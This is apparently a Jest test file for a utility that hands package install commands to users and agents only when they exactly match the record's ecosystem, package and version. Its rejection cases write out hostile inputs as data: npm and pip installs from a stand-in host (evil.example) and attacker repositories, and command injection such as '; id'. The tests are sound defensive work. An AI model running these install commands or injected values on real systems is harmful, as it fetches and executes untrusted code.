import { storedInstallCommandForOutput } from './stored-install-command.util';

/**
 * A stored install command is shown with a copy button and handed to agents
 * as a command to run. Rows written by earlier versions may hold any text, so
 * the stored command is returned only when it is exactly the command built
 * from the record's own ecosystem, package and version.
 */
describe('storedInstallCommandForOutput', () => {
  const record = (
    installCommand: unknown,
    ecosystem: string,
    recommendedParentPackage: string | null,
    recommendedProposedVersion: string | null,
  ) => ({
    installCommand: installCommand as string | null,
    ecosystem,
    recommendedParentPackage,
    recommendedProposedVersion,
  });

  it.each([
    ['npm', 'express', '4.18.0', 'npm install express@4.18.0'],
    ['npm', '@types/node', '20.11.5', 'npm install @types/node@20.11.5'],
    ['pypi', 'requests', '2.31.0', 'pip install requests==2.31.0'],
    ['pip', 'pkg', '1.0+local.7', 'pip install pkg==1.0+local.7'],
    [
      'maven',
      'org.apache.logging.log4j:log4j-core',
      '2.17.1',
      '# Update org.apache.logging.log4j:log4j-core to version 2.17.1 in pom.xml',
    ],
    ['go', 'golang.org/x/net', '0.23.0', 'go get golang.org/x/net@v0.23.0'],
    [
      'nuget',
      'Newtonsoft.Json',
      '13.0.3',
      'dotnet add package Newtonsoft.Json --version 13.0.3',
    ],
    [
      'packagist',
      'symfony/http-foundation',
      '6.4.8',
      'composer require symfony/http-foundation:6.4.8',
    ],
    ['rubygems', 'rails', '7.1.3.2', 'gem install rails -v 7.1.3.2'],
    ['crates', 'serde', '1.0.197', 'cargo add serde@1.0.197'],
    [
      'swiftpm',
      'github.com/apple/swift-nio',
      '2.65.0',
      '# Update github.com/apple/swift-nio to version 2.65.0',
    ],
  ])(
    '%s: returns the stored command equal to the rebuilt one',
    (ecosystem, name, version, command) => {
      expect(
        storedInstallCommandForOutput(
          record(command, ecosystem, name, version),
        ),
      ).toBe(command);
    },
  );

  // Commands a package manager reads as a remote or local source instead of
  // a registry package, stored next to an ordinary package and version.
  it.each([
    ['npm', 'npm install https://evil.example/x.tgz'],
    ['npm', 'npm install x@github:attacker/repo'],
    ['npm', 'npm install attacker/repo'],
    ['npm', 'npm install x@file:../../x'],
    ['npm', 'npm install x@npm:evil@1.0.0'],
    ['pypi', 'pip install https://evil.example/x.whl'],
    ['pypi', 'pip install git+https://evil.example/r'],
  ])('%s: returns no command for %j', (ecosystem, command) => {
    expect(
      storedInstallCommandForOutput(
        record(command, ecosystem, 'express', '4.18.0'),
      ),
    ).toBe('');
  });

  it.each([
    ['another package', 'npm install lodash@4.18.0'],
    ['another version', 'npm install express@5.0.0'],
    ['another ecosystem', 'pip install express==4.18.0'],
    ['shell syntax', 'npm install express@4.18.0; id'],
    ['an option', 'npm install --registry=x express@4.18.0'],
    ['a trailing space', 'npm install express@4.18.0 '],
  ])(
    'returns no command that is valid in shape but differs from its record (%s)',
    (_label, command) => {
      expect(
        storedInstallCommandForOutput(
          record(command, 'npm', 'express', '4.18.0'),
        ),
      ).toBe('');
    },
  );

  it('returns no command when the stored package is not a package name', () => {
    expect(
      storedInstallCommandForOutput(
        record('npm install express;id@4.18.0', 'npm', 'express;id', '4.18.0'),
      ),
    ).toBe('');
  });

  it.each([
    ['no command', null, 'express', '4.18.0'],
    ['an empty command', '', 'express', '4.18.0'],
    ['no package', 'npm install express@4.18.0', null, '4.18.0'],
    ['no version', 'npm install express@4.18.0', 'express', null],
    ['a command that is not a string', 42, 'express', '4.18.0'],
  ])('returns no command for %s', (_label, command, name, version) => {
    expect(
      storedInstallCommandForOutput(record(command, 'npm', name, version)),
    ).toBe('');
  });
});
